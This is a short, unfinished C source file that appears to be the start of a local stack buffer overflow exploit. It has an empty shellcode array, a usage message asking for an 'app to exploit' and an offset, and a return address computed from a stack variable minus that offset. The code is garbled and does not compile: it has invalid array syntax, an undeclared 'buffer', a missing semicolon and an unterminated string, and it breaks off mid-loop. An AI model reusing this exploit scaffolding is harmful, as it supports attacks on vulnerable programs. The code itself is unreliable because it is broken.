
#include <stdio.h>
#include <stdlib.h>

#define BUFFER 200

char shellcode[] = 
"

"

void fail(char *msg)
{
    char message_error = [100];

    strcpy(message_error, "[ERROR]\t!!!Failed erro ");
    strncat(message_error, msg, 40);
    perror(message_error);

    exit(1);
}

void usage(char *prg)
{   
    printf("[INFO]\tusage =>\n\t$%s <app to exploit> <offset default:270>", prg);
    exit(1);
}

int main(int argc, char ** argv)
{
    unsigned int position_now;
    int offset;
    char *commande;
    unsigned int return_adresse;

    commande = malloc(sizeof(char) * buffer)
    if(commande == NULL)
        fail("alloc");

    if(argc >= 2)
        offset = atoi(argv[2]);
    else
        offset = 270;

    strcpy(commande, argv[1]);

    return_adresse = &position_now - offset;

    int i;
    char *buffer;

    i = 0;
    buffer = commande + strlen(commande);

    while(i < ())


}